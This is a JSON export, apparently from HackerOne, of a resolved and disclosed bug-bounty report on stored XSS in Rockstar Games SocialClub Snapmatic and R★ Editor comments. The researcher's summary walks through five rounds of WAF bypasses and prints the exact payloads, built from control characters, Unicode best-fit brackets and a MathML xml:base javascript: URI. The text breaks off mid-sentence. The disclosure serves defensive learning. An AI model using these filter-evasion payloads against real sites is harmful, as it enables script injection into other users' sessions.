@@ -1,0 +1,525 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-04-08T13:42:19.897Z", 
+    "voters": [
+        "jokebookservice1", 
+        "irvinlim", 
+        "flamezzz", 
+        "manoelt", 
+        "knight9", 
+        "sp1d3rs", 
+        "airblender", 
+        "michiel", 
+        "danila_xawdxawdx", 
+        "spam404", 
+        "and 85 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 309531, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-04-19T22:14:18.550Z", 
+    "vulnerability_information": "", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "Stored XSS in Snapmatic + R\u2605Editor comments", 
+    "is_member_of_team?": null, 
+    "vote_count": 95, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 7165, 
+            "content": "**Summary provided by the Researcher, @europa .**\n___________________________________________________________________________________________________________________________\nI requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to also allow me to summarize the research that went into the other 5 reports. \nHave fun!\n\n### Report #1\nThe 6-months adventure into researching and bypassing the SocialClub WAF begun with a simple discovery at first: while the WAF was removing anything enclosed in `<.*`, some **control characters** (`\\b \\f \\n \\r \\t`) weren't being taken into account when injecting a `<`, allowing an adversary to create a malicious payload in the simple form of `<\\t`.\n\nA fix was deployed to **remove anything following a** `<`.\n\n### Report #2\nTwo weeks after the fix, I ended up discovering what would soon become a \u201chead-scratching\u201d mystery: injecting a **single** `%` in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped `<` along with the escaped one.\n\nThe original payload was complex and confusing, and it led me to the wrong conclusion that [over-consumption flaws](https://hackerone.com/redirect?signature=e9fdfe4ae08f06fd697d9820b6472cbc3aceb3a2&url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23overconsumption) were to blame, but as analysis proceeded, it was finally discovered that the culprit was the **simple, single** `%`.\n\nThe final payload `<%&lt;script/src=//...?` produced an output of `&lt;%<script/src=\"//...\" <=\"\" p=\"\">` from the back-end.\n\nA fix was deployed and the WAF rules were made more strict, defeating all attempts with a 302 redirect to an error page.\n\n### Report #3\nTwo months after the last fix, I discovered how the WAF wouldn't account for [Full-Width](https://hackerone.com/redirect?signature=94c9f9639fb2c55281d3c1e2820f40ecadc45807&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFF00) and [Small-Forms](https://hackerone.com/redirect?signature=e823898824394a9c0700e14806b23d9982e8d57a&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFE50) variants which, chained with the `%` confusion from the second report would again trick the back-end into producing a valid output: indeed, giving **`U+FF1C`** or **`U+FE64`** as the input would pass the WAF and the back-end would transform both into `<`. This is called a [best-fit match flaw](https://hackerone.com/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit) and it usually happens on Windows-powered technology stacks, where one of the processing layers fails to properly account for missing characters in destination codepages.\n\nThe payload `\\uFE64%\\uFF1Cscript/src=//...?`, evaded the WAF and produced `&lt;%<script/src=\"//...?\" class=\"badLink\"` in the HTML page.\n\nA first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of **control chars, percentages, breaks, and exotic function invokation**. The payload `\\uFF1C%\\uFE64input/autofocus onfocus\\b='[1].find(alert)'` successfully bypassed the new filters and popped an alert before the report was closed as resolved, allowing the team to look for a better solution in time. A second, stronger fix was deployed and the WAF rules were made even stricter prohibiting any combination of direct or indirect forms of `<` and `%` in suspicious contextes, plus any shape or form of `onXXX` DOM events.\n\n### Report #4\nThe new WAF rules prevented any kind of injection: no useful HTML elements, no DOM events. Anything went straight to /dev/null. After spending a few weeks in trial & error tests, I remembered how the payload from **report #3** would have a `badLink class` added to it, as the back-end detected a suspicious URI in the comment and would ~~strike it out~~ and prevent it from becoming clickable.\n\nAfter weeks of tests, in a few hours I was able to chain **_eight_ different techniques** to go through the WAF, the back-end filter, and the client-side Javascript filter:\n\n1. using `<>` to separate \u201ctrigger words\u201d in order to turn them \u201cinvisible\u201d to the WAF (ie: `&<>lt;`). The _back-end_ would remove it for me.\n2. using `\\u0025` instead of `%` which would now trigger the WAF\n3. using the unaccounted for `MATH` [MathML](https://hackerone.com/redirect?signature=f00315bb1ba003cb663832891ce2f04a5e1709e2&url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FMathML%2FElement%2Fmath) element\n4. using control characters (`\\n \\t \\b \\r \\f` from **report #1**) to break element names to trick the _back-end_ (not the WAF) into reassembling them in output (ie: `<m\\bath` instead of `<math`)\n5. using the `xml:base` attribute instead of the usual `href` to specify a Javascript URI\n6. injecting quotes to mess up the output from the back-end\n7. using an innocuos `href=#` to make everything following the payload clickable\n8. using a **fake URL** enclosed in `[]` to exploit a flaw in the rendering engine in the back-end that would cause it to move the payload outside of the \"badUrl\" element and place it where we could use it\n\nThe final payload was `&<>lt;%&<>lt;m\\bath xml:base=\\\"j<>avascript:alert(document.domain)//\\\" href=#\\\"[bad.url.pls]` which produced `&lt%<math xml:base=\"javascript:alert(document.domain)//\" href=\"#\" x=\"\" class=\"badLink\">[bad.url.pls]`\n\nAs a bonus note, this led to the discovery of a particular payload that would render a newsfeed comment **un-repliable and un-deletable**. Both flaws were fixed with better rules, and by preventing the back-end from stripping \u201c*conveniently-placed*\u201d tags and control characters.\n\n### Report #5\nSomewhat less-related to the SocialClub per s\u00e9, this was a variation on **report #3** where it was discovered that Snapmatic and R\u2605 Editor comments would go a different validation flow than any other entry, and the [best-fit matchings](https://hackerone.com/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit) would once again act up but on a different codepage this time, when using **Left-Angle brackets** `U+3008 \"\u3008\"` from the [Cjk Symbols and Punctuation block](https://hackerone.com/redirect?signature=73b9a54dadbf0c72c2d6cba07cdf52f97d13da52&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B3000), and **Left-pointing Angle brackets** `U+2329 \"\u2329\"` from the [Miscellaneus Technical block](https://hackerone.com/redirect?signature=12de40484af21138b7e46413f2fa9bc6eaff769e&url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B2300).\n\nWhile the Snapmatic/R\u2605 Editor back-end would block `U+FF1C` and `U+FE64`, the other two would go through and get \"matched\" to `<` somewhere in the web technology stack. My last payload was `\u3008script/src=//...?` and it was promptly fixed in both its variations.\n\n### Conclusions\nThe Rockstar Games team is amazing. My first duplicate report was with them back in September and if it wasn't for @jmarshall reacting so politely to my unjustified noobish irk to a duplicate I would've probably dropped bug bounties altogether.\n\nIt's been great to be involved all these months into researching new things and approaches\u2014failing for weeks at a time allowed me to learn new techniques and extremely peculiar quirks I now feel ready to share with the community. I still go back and try new ideas as of today, so far without success. Which is great.\n\nAd maiora!", 
+            "content_html": "<p><strong>Summary provided by the Researcher, <a href=\"/europa\">@europa</a> .</strong></p>\n\n<hr>\n\n<p>I requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to also allow me to summarize the research that went into the other 5 reports. <br>\nHave fun!</p>\n\n<h3 id=\"report-1\">Report #1</h3>\n\n<p>The 6-months adventure into researching and bypassing the SocialClub WAF begun with a simple discovery at first: while the WAF was removing anything enclosed in <code>&lt;.*</code>, some <strong>control characters</strong> (<code>\\b \\f \\n \\r \\t</code>) weren&#39;t being taken into account when injecting a <code>&lt;</code>, allowing an adversary to create a malicious payload in the simple form of <code>&lt;\\t</code>.</p>\n\n<p>A fix was deployed to <strong>remove anything following a</strong> <code>&lt;</code>.</p>\n\n<h3 id=\"report-2\">Report #2</h3>\n\n<p>Two weeks after the fix, I ended up discovering what would soon become a \u201chead-scratching\u201d mystery: injecting a <strong>single</strong> <code>%</code> in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped <code>&lt;</code> along with the escaped one.</p>\n\n<p>The original payload was complex and confusing, and it led me to the wrong conclusion that <a href=\"https://hackerone.com/redirect?signature=e9fdfe4ae08f06fd697d9820b6472cbc3aceb3a2&amp;url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23overconsumption\">over-consumption flaws</a> were to blame, but as analysis proceeded, it was finally discovered that the culprit was the <strong>simple, single</strong> <code>%</code>.</p>\n\n<p>The final payload <code>&lt;%&amp;lt;script/src=//...?</code> produced an output of <code>&amp;lt;%&lt;script/src=&quot;//...&quot; &lt;=&quot;&quot; p=&quot;&quot;&gt;</code> from the back-end.</p>\n\n<p>A fix was deployed and the WAF rules were made more strict, defeating all attempts with a 302 redirect to an error page.</p>\n\n<h3 id=\"report-3\">Report #3</h3>\n\n<p>Two months after the last fix, I discovered how the WAF wouldn&#39;t account for <a href=\"https://hackerone.com/redirect?signature=94c9f9639fb2c55281d3c1e2820f40ecadc45807&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFF00\">Full-Width</a> and <a href=\"https://hackerone.com/redirect?signature=e823898824394a9c0700e14806b23d9982e8d57a&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFE50\">Small-Forms</a> variants which, chained with the <code>%</code> confusion from the second report would again trick the back-end into producing a valid output: indeed, giving <strong><code>U+FF1C</code></strong> or <strong><code>U+FE64</code></strong> as the input would pass the WAF and the back-end would transform both into <code>&lt;</code>. This is called a <a href=\"https://hackerone.com/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&amp;url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit\">best-fit match flaw</a> and it usually happens on Windows-powered technology stacks, where one of the processing layers fails to properly account for missing characters in destination codepages.</p>\n\n<p>The payload <code>\\uFE64%\\uFF1Cscript/src=//...?</code>, evaded the WAF and produced <code>&amp;lt;%&lt;script/src=&quot;//...?&quot; class=&quot;badLink&quot;</code> in the HTML page.</p>\n\n<p>A first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of <strong>control chars, percentages, breaks, and exotic function invokation</strong>. The payload <code>\\uFF1C%\\uFE64input/autofocus onfocus\\b=&#39;[1].find(alert)&#39;</code> successfully bypassed the new filters and popped an alert before the report was closed as resolved, allowing the team to look for a better solution in time. A second, stronger fix was deployed and the WAF rules were made even stricter prohibiting any combination of direct or indirect forms of <code>&lt;</code> and <code>%</code> in suspicious contextes, plus any shape or form of <code>onXXX</code> DOM events.</p>\n\n<h3 id=\"report-4\">Report #4</h3>\n\n<p>The new WAF rules prevented any kind of injection: no useful HTML elements, no DOM events. Anything went straight to /dev/null. After spending a few weeks in trial &amp; error tests, I remembered how the payload from <strong>report #3</strong> would have a <code>badLink class</code> added to it, as the back-end detected a suspicious URI in the comment and would <del>strike it out</del> and prevent it from becoming clickable.</p>\n\n<p>After weeks of tests, in a few hours I was able to chain <strong><u>eight</u> different techniques</strong> to go through the WAF, the back-end filter, and the client-side Javascript filter:</p>\n\n<ol>\n<li>using <code>&lt;&gt;</code> to separate \u201ctrigger words\u201d in order to turn them \u201cinvisible\u201d to the WAF (ie: <code>&amp;&lt;&gt;lt;</code>). The <u>back-end</u> would remove it for me.</li>\n<li>using <code>\\u0025</code> instead of <code>%</code> which would now trigger the WAF</li>\n<li>using the unaccounted for <code>MATH</code> <a href=\"https://hackerone.com/redirect?signature=f00315bb1ba003cb663832891ce2f04a5e1709e2&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FMathML%2FElement%2Fmath\">MathML</a> element</li>\n<li>using control characters (<code>\\n \\t \\b \\r \\f</code> from <strong>report #1</strong>) to break element names to trick the <u>back-end</u> (not the WAF) into reassembling them in output (ie: <code>&lt;m\\bath</code> instead of <code>&lt;math</code>)</li>\n<li>using the <code>xml:base</code> attribute instead of the usual <code>href</code> to specify a Javascript URI</li>\n<li>injecting quotes to mess up the output from the back-end</li>\n<li>using an innocuos <code>href=#</code> to make everything following the payload clickable</li>\n<li>using a <strong>fake URL</strong> enclosed in <code>[]</code> to exploit a flaw in the rendering engine in the back-end that would cause it to move the payload outside of the &quot;badUrl&quot; element and place it where we could use it</li>\n</ol>\n\n<p>The final payload was <code>&amp;&lt;&gt;lt;%&amp;&lt;&gt;lt;m\\bath xml:base=\\&quot;j&lt;&gt;avascript:alert(document.domain)//\\&quot; href=#\\&quot;[bad.url.pls]</code> which produced <code>&amp;lt%&lt;math xml:base=&quot;javascript:alert(document.domain)//&quot; href=&quot;#&quot; x=&quot;&quot; class=&quot;badLink&quot;&gt;[bad.url.pls]</code></p>\n\n<p>As a bonus note, this led to the discovery of a particular payload that would render a newsfeed comment <strong>un-repliable and un-deletable</strong>. Both flaws were fixed with better rules, and by preventing the back-end from stripping \u201c<em>conveniently-placed</em>\u201d tags and control characters.</p>\n\n<h3 id=\"report-5\">Report #5</h3>\n\n<p>Somewhat less-related to the SocialClub per s\u00e9, this was a variation on <strong>report #3</strong> where it was discovered that Snapmatic and R\u2605 Editor comments would go a different validation flow than any other entry, and the <a href=\"https://hackerone.com/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&amp;url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit\">best-fit matchings</a> would once again act up but on a different codepage this time, when using <strong>Left-Angle brackets</strong> <code>U+3008 &quot;\u3008&quot;</code> from the <a href=\"https://hackerone.com/redirect?signature=73b9a54dadbf0c72c2d6cba07cdf52f97d13da52&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B3000\">Cjk Symbols and Punctuation block</a>, and <strong>Left-pointing Angle brackets</strong> <code>U+2329 &quot;\u2329&quot;</code> from the <a href=\"https://hackerone.com/redirect?signature=12de40484af21138b7e46413f2fa9bc6eaff769e&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B2300\">Miscellaneus Technical block</a>.</p>\n\n<p>While the Snapmatic/R\u2605 Editor back-end would block <code>U+FF1C</code> and <code>U+FE64</code>, the other two would go through and get &quot;matched&quot; to <code>&lt;</code> somewhere in the web technology stack. My last payload was <code>\u3008script/src=//...?</code> and it was promptly fixed in both its variations.</p>\n\n<h3 id=\"conclusions\">Conclusions</h3>\n\n<p>The Rockstar Games team is amazing. My first duplicate report was with them back in September and if it wasn&#39;t for <a href=\"/jmarshall\">@jmarshall</a> reacting so politely to my unjustified noobish irk to a duplicate I would&#39;ve probably dropped bug bounties altogether.</p>\n\n<p>It&#39;s been great to be involved all these months into researching new things and approaches\u2014failing for weeks at a time allowed me to learn new techniques and extremely peculiar quirks I now feel ready to share with the community. I still go back and try new ideas as of today, so far without success. Which is great.</p>\n\n<p>Ad maiora!</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 7061, 
+            "content": "I requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to also allow me to summarize the research that went into the other 5 reports. \nHave fun!\n\n---\n\n### Report #1\nThe 6-months adventure into researching and bypassing the SocialClub WAF begun with a simple discovery at first: while the WAF was removing anything enclosed in `<.*`, some **control characters** (`\\b \\f \\n \\r \\t`) weren't being taken into account when injecting a `<`, allowing an adversary to create a malicious payload in the simple form of `<\\t`.\n\nA fix was deployed to **remove anything following a `<`**.\n\n### Report #2\nTwo weeks after the fix, I ended up discovering what would soon become a \u201chead-scratching\u201d mystery: injecting a **single `%`** in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped `<` along with the escaped one.  \nThe original payload was complex and confusing, and it led me to the wrong conclusion that [over-consumption flaws](https://websec.github.io/unicode-security-guide/character-transformations/#overconsumption) were to blame, but as analysis proceeded, it was finally discovered that the culprit was the **simple, single `%`**.\n\nThe final payload `<%&lt;script/src=//...?` produced an output of `&lt;%<script/src=\"//...\" <=\"\" p=\"\">` from the back-end.\n\nA fix was deployed and the WAF rules were made more strict, defeating all attempts with a 302 redirect to an error page.\n\n### Report #3\nTwo months after the last fix, I discovered how the WAF wouldn't account for [**Full-Width**](https://www.compart.com/en/unicode/block/U+FF00) and [**Small-Forms**](https://www.compart.com/en/unicode/block/U+FE50) variants which, chained with the `%` confusion from the second report would again trick the back-end into producing a valid output: indeed, giving **`U+FF1C` or `U+FE64`** as the input would pass the WAF and the back-end would transform both into `<`. This is called a [best-fit match flaw](https://websec.github.io/unicode-security-guide/character-transformations/#best-fit) and it usually happens on Windows-powered technology stacks, where one of the processing layers fails to properly account for missing characters in destination codepages.\n\nThe payload `\\uFE64%\\uFF1Cscript/src=//...?`, evaded the WAF and produced `&lt;%<script/src=\"//...?\" class=\"badLink\"` in the HTML page.  \n\nA first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of **control chars, percentages, breaks, and exotic function invokation**.  The payload `\\uFF1C%\\uFE64input/autofocus onfocus\\b='[1].find(alert)'` successfully bypassed the new filters and popped an alert before the report was closed as resolved, allowing the team to look for a better solution in time. A second, stronger fix was deployed and the WAF rules were made even stricter prohibiting any combination of direct or indirect forms of `<` and `%` in suspicious contextes, plus any shape or form of `onXXX` DOM events.\n\n### Report #4\nThe new WAF rules prevented *any* kind of injection: no useful HTML elements, no DOM events. Anything went straight to /dev/null. After spending a few weeks in trial & error tests, I remembered how the payload from **report #3** would have a `badLink` class added to it, as the back-end detected a suspicious URI in the comment and would ~~strike it out~~ and prevent it from becoming clickable.\n\nAfter weeks of tests, in a few hours I was able to chain **_eight_ different techniques** to go through the WAF, the back-end filter, and the client-side Javascript filter:\n\n1. using `<>` to separate \u201ctrigger words\u201d in order to turn them \u201cinvisible\u201d to the WAF (ie: `&<>lt;`). The _back-end_ would remove it for me.\n2. using `\\u0025` instead of `%` which would now trigger the WAF\n3. using the unaccounted for `MATH` [MathML element](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math)\n4. using control characters (`\\n \\t \\b \\r \\f` from **report #1**) to break element names to trick the _back-end_ (not the WAF) into reassembling them in output (ie: `<m\\bath` instead of `<math`)\n5. using the `xml:base` attribute instead of the usual `href` to specify a Javascript URI\n6. injecting quotes to mess up the output from the back-end\n7. using an innocuos `href=#` to make everything following the payload clickable\n8. using a **fake URL** enclosed in `[]` to exploit a flaw in the rendering engine in the back-end that would cause it to move the payload *outside* of the \"badUrl\" element and place it where we could use it \n\nThe final payload was `&<>lt;%&<>lt;m\\bath xml:base=\\\"j<>avascript:alert(document.domain)//\\\" href=#\\\"[bad.url.pls]` which produced `&lt%<math xml:base=\"javascript:alert(document.domain)//\" href=\"#\" x=\"\" class=\"badLink\">[bad.url.pls]`\n\nAs a bonus note, this led to the discovery of a particular payload that would render a newsfeed comment **un-repliable and un-deletable**. Both flaws were fixed with better rules, and by preventing the back-end from stripping *\u201cconveniently-placed\u201d* tags and control characters.\n\n### Report #5\nSomewhat *less-related* to the SocialClub per s\u00e9, this was a variation on **report #3** where it was discovered that Snapmatic and R\u2605 Editor comments would go a different validation flow than any other entry, and the [best-fit matchings](https://websec.github.io/unicode-security-guide/character-transformations/#best-fit) would once again act up but on a different codepage this time, when using **Left-Angle brackets** `U+3008 \"\u3008\"` from the [Cjk Symbols and Punctuation block](https://www.compart.com/en/unicode/block/U+3000), and **Left-pointing Angle brackets** `U+2329 \"\u2329\"` from the [Miscellaneus Technical block](https://www.compart.com/en/unicode/block/U+2300).\n\nWhile the Snapmatic/R\u2605 Editor back-end would block `U+FF1C` and `U+FE64`, the other two would go through and get \"matched\" to `<` somewhere in the web technology stack. My last payload was `\u3008script/src=//...?` and it was promptly fixed in both its variations.\n\n### Conclusions\nThe Rockstar Games team is amazing. My first duplicate report was with them back in September and if it wasn't for @jmarshall reacting so politely to my unjustified noobish irk to a duplicate I would've probably dropped bug bounties altogether.  \nIt's been great to be involved all these months into researching new things and approaches\u2014failing for weeks at a time allowed me to learn new techniques and extremely peculiar quirks I now feel ready to share with the community. I still go back and try new ideas as of today, so far without success. Which is great.\n\nAd maiora!", 
+            "content_html": "<p>I requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to also allow me to summarize the research that went into the other 5 reports. <br>\nHave fun!</p>\n\n<hr>\n\n<h3 id=\"report-1\">Report #1</h3>\n\n<p>The 6-months adventure into researching and bypassing the SocialClub WAF begun with a simple discovery at first: while the WAF was removing anything enclosed in <code>&lt;.*</code>, some <strong>control characters</strong> (<code>\\b \\f \\n \\r \\t</code>) weren&#39;t being taken into account when injecting a <code>&lt;</code>, allowing an adversary to create a malicious payload in the simple form of <code>&lt;\\t</code>.</p>\n\n<p>A fix was deployed to <strong>remove anything following a <code>&lt;</code></strong>.</p>\n\n<h3 id=\"report-2\">Report #2</h3>\n\n<p>Two weeks after the fix, I ended up discovering what would soon become a \u201chead-scratching\u201d mystery: injecting a <strong>single <code>%</code></strong> in the payload would bypass the filter entirely and force the back-end to somehow produce an unescaped <code>&lt;</code> along with the escaped one.<br><br>\nThe original payload was complex and confusing, and it led me to the wrong conclusion that <a href=\"/redirect?signature=e9fdfe4ae08f06fd697d9820b6472cbc3aceb3a2&amp;url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23overconsumption\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>over-consumption flaws</span><i class=\"icon-external-link\"></i></a> were to blame, but as analysis proceeded, it was finally discovered that the culprit was the <strong>simple, single <code>%</code></strong>.</p>\n\n<p>The final payload <code>&lt;%&amp;lt;script/src=//...?</code> produced an output of <code>&amp;lt;%&lt;script/src=&quot;//...&quot; &lt;=&quot;&quot; p=&quot;&quot;&gt;</code> from the back-end.</p>\n\n<p>A fix was deployed and the WAF rules were made more strict, defeating all attempts with a 302 redirect to an error page.</p>\n\n<h3 id=\"report-3\">Report #3</h3>\n\n<p>Two months after the last fix, I discovered how the WAF wouldn&#39;t account for <a href=\"/redirect?signature=94c9f9639fb2c55281d3c1e2820f40ecadc45807&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFF00\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span><strong>Full-Width</strong></span><i class=\"icon-external-link\"></i></a> and <a href=\"/redirect?signature=e823898824394a9c0700e14806b23d9982e8d57a&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2BFE50\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span><strong>Small-Forms</strong></span><i class=\"icon-external-link\"></i></a> variants which, chained with the <code>%</code> confusion from the second report would again trick the back-end into producing a valid output: indeed, giving <strong><code>U+FF1C</code> or <code>U+FE64</code></strong> as the input would pass the WAF and the back-end would transform both into <code>&lt;</code>. This is called a <a href=\"/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&amp;url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>best-fit match flaw</span><i class=\"icon-external-link\"></i></a> and it usually happens on Windows-powered technology stacks, where one of the processing layers fails to properly account for missing characters in destination codepages.</p>\n\n<p>The payload <code>\\uFE64%\\uFF1Cscript/src=//...?</code>, evaded the WAF and produced <code>&amp;lt;%&lt;script/src=&quot;//...?&quot; class=&quot;badLink&quot;</code> in the HTML page.  </p>\n\n<p>A first fix was deployed preventing both script injections and DOM events manipulation, both of which I was able to bypass after a few days using a combination of <strong>control chars, percentages, breaks, and exotic function invokation</strong>.  The payload <code>\\uFF1C%\\uFE64input/autofocus onfocus\\b=&#39;[1].find(alert)&#39;</code> successfully bypassed the new filters and popped an alert before the report was closed as resolved, allowing the team to look for a better solution in time. A second, stronger fix was deployed and the WAF rules were made even stricter prohibiting any combination of direct or indirect forms of <code>&lt;</code> and <code>%</code> in suspicious contextes, plus any shape or form of <code>onXXX</code> DOM events.</p>\n\n<h3 id=\"report-4\">Report #4</h3>\n\n<p>The new WAF rules prevented <em>any</em> kind of injection: no useful HTML elements, no DOM events. Anything went straight to /dev/null. After spending a few weeks in trial &amp; error tests, I remembered how the payload from <strong>report #3</strong> would have a <code>badLink</code> class added to it, as the back-end detected a suspicious URI in the comment and would <del>strike it out</del> and prevent it from becoming clickable.</p>\n\n<p>After weeks of tests, in a few hours I was able to chain <strong><u>eight</u> different techniques</strong> to go through the WAF, the back-end filter, and the client-side Javascript filter:</p>\n\n<ol>\n<li>using <code>&lt;&gt;</code> to separate \u201ctrigger words\u201d in order to turn them \u201cinvisible\u201d to the WAF (ie: <code>&amp;&lt;&gt;lt;</code>). The <u>back-end</u> would remove it for me.</li>\n<li>using <code>\\u0025</code> instead of <code>%</code> which would now trigger the WAF</li>\n<li>using the unaccounted for <code>MATH</code> <a href=\"/redirect?signature=f00315bb1ba003cb663832891ce2f04a5e1709e2&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FMathML%2FElement%2Fmath\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>MathML element</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>using control characters (<code>\\n \\t \\b \\r \\f</code> from <strong>report #1</strong>) to break element names to trick the <u>back-end</u> (not the WAF) into reassembling them in output (ie: <code>&lt;m\\bath</code> instead of <code>&lt;math</code>)</li>\n<li>using the <code>xml:base</code> attribute instead of the usual <code>href</code> to specify a Javascript URI</li>\n<li>injecting quotes to mess up the output from the back-end</li>\n<li>using an innocuos <code>href=#</code> to make everything following the payload clickable</li>\n<li>using a <strong>fake URL</strong> enclosed in <code>[]</code> to exploit a flaw in the rendering engine in the back-end that would cause it to move the payload <em>outside</em> of the &quot;badUrl&quot; element and place it where we could use it </li>\n</ol>\n\n<p>The final payload was <code>&amp;&lt;&gt;lt;%&amp;&lt;&gt;lt;m\\bath xml:base=\\&quot;j&lt;&gt;avascript:alert(document.domain)//\\&quot; href=#\\&quot;[bad.url.pls]</code> which produced <code>&amp;lt%&lt;math xml:base=&quot;javascript:alert(document.domain)//&quot; href=&quot;#&quot; x=&quot;&quot; class=&quot;badLink&quot;&gt;[bad.url.pls]</code></p>\n\n<p>As a bonus note, this led to the discovery of a particular payload that would render a newsfeed comment <strong>un-repliable and un-deletable</strong>. Both flaws were fixed with better rules, and by preventing the back-end from stripping <em>\u201cconveniently-placed\u201d</em> tags and control characters.</p>\n\n<h3 id=\"report-5\">Report #5</h3>\n\n<p>Somewhat <em>less-related</em> to the SocialClub per s\u00e9, this was a variation on <strong>report #3</strong> where it was discovered that Snapmatic and R\u2605 Editor comments would go a different validation flow than any other entry, and the <a href=\"/redirect?signature=bc75d2374467e877b490cd0801b7c340ad395857&amp;url=https%3A%2F%2Fwebsec.github.io%2Funicode-security-guide%2Fcharacter-transformations%2F%23best-fit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>best-fit matchings</span><i class=\"icon-external-link\"></i></a> would once again act up but on a different codepage this time, when using <strong>Left-Angle brackets</strong> <code>U+3008 &quot;\u3008&quot;</code> from the <a href=\"/redirect?signature=73b9a54dadbf0c72c2d6cba07cdf52f97d13da52&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B3000\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Cjk Symbols and Punctuation block</span><i class=\"icon-external-link\"></i></a>, and <strong>Left-pointing Angle brackets</strong> <code>U+2329 &quot;\u2329&quot;</code> from the <a href=\"/redirect?signature=12de40484af21138b7e46413f2fa9bc6eaff769e&amp;url=https%3A%2F%2Fwww.compart.com%2Fen%2Funicode%2Fblock%2FU%2B2300\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Miscellaneus Technical block</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>While the Snapmatic/R\u2605 Editor back-end would block <code>U+FF1C</code> and <code>U+FE64</code>, the other two would go through and get &quot;matched&quot; to <code>&lt;</code> somewhere in the web technology stack. My last payload was 